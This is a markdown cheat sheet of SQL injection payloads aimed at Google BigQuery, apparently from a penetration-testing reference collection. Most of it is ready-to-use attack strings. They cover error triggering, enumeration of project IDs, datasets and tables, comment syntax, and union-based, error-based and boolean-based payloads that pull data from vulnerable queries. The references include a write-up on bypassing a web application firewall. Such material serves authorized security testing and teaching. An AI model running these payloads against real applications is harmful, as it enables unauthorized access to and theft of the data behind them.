# google bigquery sql injection

> google bigquery sql injection  is a type of security vulnerability where an attacker can execute arbitrary sql queries on a google bigquery database by manipulating user inputs that are incorporated into sql queries without proper sanitization. this can lead to unauthorized data access, data manipulation, or other malicious activities.

## summary

* [detection](#detection)
* [bigquery comment](#bigquery-comment)
* [bigquery union based](#bigquery-union-based)
* [bigquery error based](#bigquery-error-based)
* [bigquery boolean based](#bigquery-boolean-based)
* [bigquery time based](#bigquery-time-based)
* [references](#references)


## detection

* use a classic single quote to trigger an error: `'`
* identify bigquery using backtick notation: ```select .... from `` as ...```

| sql query                                             | description |
| ----------------------------------------------------- | -------------------- |
| `select @@project_id`                                 | gathering project id |
| `select schema_name from information_schema.schemata` | gathering all dataset names |
| `select * from project_id.dataset_name.table_name`    | gathering data from specific project id & dataset |


## bigquery comment

| type                       | description                       |
|----------------------------|-----------------------------------|
| `#`                        | hash comment                      |
| `/* postgresql comment */` | c-style comment                   |


## bigquery union based

```ps1
union all select (select @@project_id),1,1,1,1,1,1)) as t1 group by column_name#
true) group by column_name limit 1 union all select (select 'asd'),1,1,1,1,1,1)) as t1 group by column_name#
true) group by column_name limit 1 union all select (select @@project_id),1,1,1,1,1,1)) as t1 group by column_name#
' group by column_name union all select column_name,1,1 from  (select column_name as new_name from `project_id.dataset_name.table_name`) as a group by column_name#
```

## bigquery error based

| sql query                                                | description          |
| -------------------------------------------------------- | -------------------- |
| `' or if(1/(length((select('a')))-1)=1,true,false) or '` | division by zero     |
| `select cast(@@project_id as int64)`                     | casting              |


## bigquery boolean based

```ps1
' where substring((select column_name from `project_id.dataset_name.table_name` limit 1),1,1)='a'#
```

## bigquery time based

* time based functions does not exist in the bigquery syntax.


## references

* [bigquery sql injection cheat sheet - ozgur alp - february 14, 2022](https://ozguralp.medium.com/bigquery-sql-injection-cheat-sheet-65ad70e11eac)
* [bigquery documentation - query syntax - october 30, 2024](https://cloud.google.com/bigquery/docs/reference/standard-sql/query-syntax)
* [bigquery documentation - functions and operators - october 30, 2024](https://cloud.google.com/bigquery/docs/reference/standard-sql/functions-and-operators)
* [akamai web application firewall bypass journey: exploiting “google bigquery” sql injection vulnerability - duc nguyen - march 31, 2020](https://hackemall.live/index.php/2020/03/31/akamai-web-application-firewall-bypass-journey-exploiting-google-bigquery-sql-injection-vulnerability/)